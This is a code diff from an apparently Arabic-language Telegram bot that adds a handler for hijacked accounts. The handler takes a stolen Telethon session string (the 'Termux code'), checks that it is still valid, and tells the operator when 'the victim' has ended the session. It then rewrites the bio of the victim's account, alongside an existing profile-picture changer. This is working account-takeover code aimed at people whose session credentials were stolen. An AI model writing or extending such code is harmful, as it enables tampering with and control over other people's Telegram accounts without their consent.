@@ -843,25 +843,23 @@ async def users(event):
         await change_pic(strses.text, new_pic)  # استلام الصوره هنا
         await event.reply(" تم تغيير صورة الحساب بنجاح ", buttons=keyboard)
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        ############
-        
+#v_d_m
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"X")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+
+        await x.send_message("انطيني الكلام الي تريدة بالبايو")
+        new_bio_msg = await x.get_response()
+        new_bio_text = new_bio_msg.text
+        await change_bio(strses.text, new_bio_text) 
+        await event.reply(" غيرت البايو 🐍", buttons=keyboard)
         
         
         
